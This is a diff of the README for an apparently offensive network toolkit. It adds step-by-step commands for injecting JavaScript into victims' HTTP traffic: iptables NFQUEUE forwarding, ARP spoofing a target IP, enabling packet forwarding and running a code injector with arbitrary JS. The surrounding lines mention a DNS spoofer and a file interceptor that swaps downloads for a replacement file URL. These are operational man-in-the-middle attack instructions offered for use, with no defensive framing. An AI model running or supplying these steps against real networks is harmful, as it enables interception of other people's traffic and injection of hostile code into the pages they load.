@@ -114,6 +114,15 @@ The DNS Spoofer window will output every successfull attack.
 - Launch File Interceptor - `sudo python file_interceptor.py -e <extension> -f <replacement file url>`
 
 
+**To inject code into an HTTP website**
+- Enable iptables FORWARD rule type NFQUEUE - `sudo iptables -I FORWARD -j NFQUEUE --queue-num 0`
+    - Disable after attack is complete. - `sudo iptables -F`
+- Launch ARP Spoofer - `sudo python3 arp_spoofer.py -tip <target_ip> -rip <spoofed_ip>`
+- Enable packet forwarding - `sudo sysctl -w net.ipv4.ip_forward=1`
+    - Disable after attack is complete. `sudo sysctl -w net.ipv4.ip_forward=0`
+- Launch Code Injector - `sudo python code_injector.py -c "<js code to inject>"`
+
+
 ### Todo
 - [ ] Script for Full workflows
 - [x] Update arp_spoofer script to handle IndexError on arrays
